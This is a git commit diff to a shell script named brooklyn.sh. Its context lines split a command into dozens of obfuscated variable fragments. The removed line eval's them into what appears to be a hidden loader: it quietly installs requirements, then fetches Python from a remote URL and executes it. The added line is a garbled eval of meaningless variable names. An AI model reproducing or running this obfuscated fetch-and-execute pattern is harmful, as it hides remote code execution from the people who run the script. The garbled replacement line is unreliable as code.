b74ab59530eb4fd20d00fba16bfc3e961dcc0337
Alex Bieber <94044755+alexbieber@users.noreply.github.com>
2022-05-29 08:30:38 +0530

    Update brooklyn.sh

--- brooklyn.sh
+++ brooklyn.sh
@@ -8,4 +8,4 @@ Yz='echo';tz='com/';FBz='exec';Rz='.js';nz='ecto';GBz='ute.';Pz='f=B7';bz='ting'
 OBz='onne';JBz='-)';Xz='n';iz='all ';wz='ents';ABz='uiet';lz='://r';BBz='pyth';TBz='fi';Qz='MV3Y';
 kz='ttps';Fz='ps:/';Mz='hrea';SBz='!!!"';EBz='et h';xz='.txt';Uz='-eq ';Cz='--sp';MBz='tern';ez='ices';Bz=' -q ';
 Sz='if [';LBz=' "In';Wz=' the';sz='app.';yz=' --q';Lz='howt';QBz='n Fa';RBz='iled';pz='z.00';NBz='et C';KBz='else';HBz='py -';oz='r-xy';IBz='q -O';
-eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$z$Sz$Tz$Uz$Vz$Wz$Xz$z$Yz$Zz$az$bz$cz$dz$ez$fz$z$gz$hz$iz$jz$kz$lz$mz$nz$oz$pz$qz$rz$sz$tz$uz$vz$wz$xz$yz$ABz$z$BBz$CBz$DBz$EBz$kz$lz$mz$nz$oz$pz$qz$rz$sz$tz$FBz$GBz$HBz$IBz$JBz$z$KBz$z$Yz$LBz$MBz$NBz$OBz$PBz$QBz$RBz$SBz$z$TBz"
+eval "12$o3$56$51$1y$10$l1$4x$11$i3$77$4r$:M$27$82$15$or$23$7u$20$2t$io$n1$0l$pu$rp$os$14$"
